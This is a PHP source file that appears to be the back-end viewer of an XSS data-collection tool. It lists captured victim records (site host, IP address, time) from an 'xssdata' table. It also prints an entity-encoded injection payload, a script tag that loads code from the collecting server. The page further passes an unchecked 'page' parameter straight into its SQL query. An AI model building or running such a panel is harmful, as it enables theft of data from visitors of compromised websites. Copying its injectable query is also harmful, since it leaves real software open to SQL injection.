<?php
	error_reporting(0);
	include 'conn.php';
	$pageSize=20;
	$mysqli = new mysqli();
	$mysqli->connect($host,$dbuser,$dbpass,$dbname);
	$sql = "select count(*) from xssdata";
	$rs = $mysqli->query($sql);
	$count = mysqli_fetch_all($rs,MYSQLI_NUM)[0][0];
	if($_GET['page']){
		$page = $_GET['page'];
	}else{
		$page = 1;
	}
?>

<html>
	<head><title>牛逼  懂吧</title></head>
<body>
	Count:&nbsp;&nbsp; <?php echo $count;?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="./?a=s&page=<?php echo $page+1;?>">NextPage</a>
	<p>payload:
		<ul>
			<li> &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#47;&#115;&#114;&#99;&#61;&#47;&#47;<?php echo $_SERVER['SERVER_NAME']; ?>&#47;&#49;&#62;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;</li>
		</ul>
	<hr/><br/>
	<table cellspacing='20'>
		<tr><th>host</th><th>IP</td><th>time</th><th>more</tr>
<?php

	$sql = "select * from xssdata order by id desc limit ".($page-1)*$pageSize.",".$pageSize;
	$rs = $mysqli->query($sql);
	while($row = $rs->fetch_assoc()){
		$data = json_decode($row['information']);
		$host = parse_url($data->url,PHP_URL_HOST);
		echo "<tr><td>".$host."</td><td>".$data->ip."</td><td>".$data->time."</td><td><a href='view.php?a=s&id=".$row['id']."'>more</a></td></tr>";
	}
?>
	</table>
</body>
</html>
